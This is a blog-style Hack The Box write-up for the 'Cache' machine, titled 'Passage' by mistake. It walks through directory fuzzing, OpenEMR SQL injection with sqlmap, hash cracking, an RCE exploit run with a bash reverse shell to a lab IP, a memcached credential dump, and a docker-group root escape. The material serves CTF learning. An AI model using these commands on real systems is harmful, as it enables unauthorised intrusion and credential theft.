@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap"
+  rel="stylesheet"> 
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Passage Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="Hackthebox - Cache Writeup" />
+      <meta property="og:description" content="A medium difficulty hackthebox machine with some pretty basic enumeration, exploitation and privesc and finally a cool D-Bus vulnerability used for pr    ivilege escalation to root." />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="https://fmash16.github.io/img/htb_cache/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-family: 'Electrolize',sans-serif;font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<h1 id="hackthebox---passage-writeup">Hackthebox - Passage Writeup</h1>
+<p><img src="/img/htb_cache/card.png" /></p>
+<h1 id="nmap-scan">Nmap scan:</h1>
+<p>Open ports:</p>
+<ul>
+<li>80 http</li>
+<li>22 ssh</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="http---port-80">HTTP - Port 80</h2>
+<p>Found login page at login.html.</p>
+<p><img src="/img/htb_cache/1.png" /></p>
+<p>Viewing source shows that successful logins redirects to net.html, which is still under construction and has an image.</p>
+<h2 id="fuzzing-with-ffuf">Fuzzing with ffuf</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="ex">ffuf</span> -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.188/FUZZ</span></code></pre></div>
+<p><img src="/img/htb_cache/2.png" /></p>
+<p>Going to the jquery directory, we find an index showing the file functionality.js which gives us some creds.</p>
+<p><img src="/img/htb_cache/3.png" /></p>
+<p><img src="/img/htb_cache/4.png" /></p>
+<p>Creds found:</p>
+<blockquote>
+<p>User: ash Password: H@v3_fun</p>
+</blockquote>
+<p>We login with the found creds and get the following</p>
+<p><img src="/img/htb_cache/5.png" /></p>
+<p>We get the same page we found the source code for before for the page net.html. Does not seem to contain anyhing interesting.</p>
+<h2 id="virtual-hosting">Virtual hosting</h2>
+<p>In the author info page, we find some info about the author, where we find out about a new software by the same author called HMS(Hospital Management system). Looking around for a long time, we find out that adding a know host by the name “hms.htb” in the /etc/hosts file, we get the hms login page going to the page hms.htb. This is called virtual hosting, where the same port can serve different domains for different hostnames. You can read up on this <a href="https://en.wikipedia.org/wiki/Virtual_hosting">here</a></p>
+<p><img src="/img/htb_cache/6.png" /></p>
+<p><img src="/img/htb_cache/7.png" /></p>
+<p>Going to hms.htb, we find the login page</p>
+<p><img src="/img/htb_cache/8.png" /></p>
+<p>It is running on openemr.</p>
+<h2 id="openemr-hms-exploit">Openemr HMS exploit</h2>
+<p>Looking for exploits for openemr, we find a quite recent one on <a href="https://www.exploit-db.com/exploits/45161">exploitdb</a> We download the exploit to our local machine</p>
+<p>For the exploit to work, we need the admin creds for the openmr, looking for more vulnerabilities, we find a sql vulnerability <a href="https://atha.io/post/2019/08/how-i-got-2nd-place-in-my-first-ctf-ever/#openemr-sql-injection">here</a>.</p>
+<p>It has been explained really well here. As per the istructions, we execute the following</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">curl</span> --cookie-jar gimmepid.cookies -v http://hms.htb/portal/account/register.php</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="ex">curl</span> -v --cookie gimmepid.cookies http://hms.htb/portal/add_edit_event_user.php\?eid\=1 <span class="op">2&gt;&amp;1</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;^&gt;&quot;</span> <span class="op">&gt;</span> test</span></code></pre></div>
+<p>We strip the “&gt;” in the headers and pass it to sqlmap. In order to list available databases, we run:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">sqlmap</span> -r test --threads=10 --dbs</span></code></pre></div>
+<p>We find 2 databases. The one we are looking for is <strong>openmr</strong> Now, we want to find the tables in the database which might contain something interesting for us. To list the tables, we run:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">sqlmap</span> -r test --threads=10 -D openemr --tables</span></code></pre></div>
+<p>We get a long list of tables in return. SInce we are looking for something about users, we grep for users and find “users” and “users_secure” “users-secure” seems interesting and so, we dump the table data running:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">sqlmap</span> -r test --threads=10 -D openemr -T users_secure --dump</span></code></pre></div>
+<p>Here, we get the user and hashes and salts for the respective users.</p>
+<p>We get the following hashes from the table:</p>
+<pre><code>openemr_admin : $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</code></pre>
+<p>Looking in the hashcat example-hashes, we find that the hash is a blowfish hash.</p>
+<p>We crack the hash with hashcat and wordlist rockyou.txt</p>
+<p>Creds found:</p>
+<ul>
+<li>openemr_admin : xxxxxx</li>
+</ul>
+<p>We use these creds with the exploit we found earlier that should let us get a reverse shell on the machine.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">python</span> openemr_rce.py http://hms.htb -u openmr_admin -p xxxxxx -c <span class="st">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.107/1337 0&gt;&amp;1&#39;</span></span></code></pre></div>
+<p>We get a shell back on the nc listener as www-data</p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="user-ash">User ash</h2>
+<p>We got some creds for user ash previouly, we try them to get the user ash</p>
+<blockquote>
+<p>password : H@v3_fun</p>
+</blockquote>
+<h2 id="user-luffy">User luffy</h2>
+<p>linpeas.sh shows a process called “memcached” being run. What is this memcached?</p>
+<p>Memcached is a general-purpose distributed memory-caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source must be read. Memcached is free and open-source software, licensed under the Revised BSD license.(source: Wikipedia)</p>
+<p>A detail guide on what commands to issue in order to dump data from the memcahce can be found at <a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">hackingarticles</a>.</p>
+<p>The memcached server runs on port 11211 by default. So, we connect to the server using nc and execute the following commands in order to dump data from the cache, and check if we find something juicy in there.</p>
+<p>Commands run :</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">nc</span> 127.0.0.1 11211</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">version</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="ex">stats</span> slabs</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a><span class="ex">status</span> items</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a><span class="ex">stats</span> cachedump 1 0</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true"></a><span class="ex">get</span> <span class="op">&lt;</span>items<span class="op">&gt;</span></span></code></pre></div>
+<p>Output:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">get</span> link</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="ex">VALUE</span> link 0 21</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a><span class="ex">https</span>://hackthebox.eu</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">END</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">get</span> user</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a><span class="ex">VALUE</span> user 0 5</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a><span class="ex">luffy</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a><span class="ex">END</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true"></a></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true"></a><span class="ex">get</span> passwd</span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true"></a><span class="ex">VALUE</span> passwd 0 9</span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true"></a><span class="ex">0n3_p1ec3</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true"></a><span class="ex">END</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true"></a></span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true"></a><span class="ex">get</span> file</span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true"></a><span class="ex">VALUE</span> file 0 7</span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true"></a><span class="ex">nothing</span></span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true"></a><span class="ex">END</span></span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true"></a></span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true"></a><span class="ex">get</span> account</span>
+<span id="cb9-22"><a href="#cb9-22" aria-hidden="true"></a><span class="ex">VALUE</span> account 0 9</span>
+<span id="cb9-23"><a href="#cb9-23" aria-hidden="true"></a><span class="ex">afhj556uo</span></span>
+<span id="cb9-24"><a href="#cb9-24" aria-hidden="true"></a><span class="ex">END</span></span></code></pre></div>
+<p>We get the password for the user luffy here.</p>
+<p>Creds found:</p>
+<blockquote>
+<p>luffy : 0n3_p1ec3</p>
+</blockquote>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<p>Issuing the command <code>id</code>, we find that the user luffy is a member of the docker group. A user belonging to the group docker can mount the root directory on any docker container, and can start the docker container without any authentication. We can use this to privesc and read sensitive files owned by root, the shadow file containing passwords, the id_rsa of the root, or in our case, the root.txt file under /root.</p>
+<p>We list the docker images avalaibale on the machine and find an ubuntu image</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">docker</span> images</span></code></pre></div>
+<p>Then we issue the following command to start the ubuntu container with an interactive shell and mounting the root filesystem on the container.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">docker</span> run -v /:/mnt --rm -it ubuntu chroot /mnt sh</span></code></pre></div>
+<p><img src="/img/htb_cache/final.png" /></p>
+</article>
+
+<footer>
+  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
+  <i class="far fa-copyright"></i> 2020-2020 </p>
+</footer>
+</body>
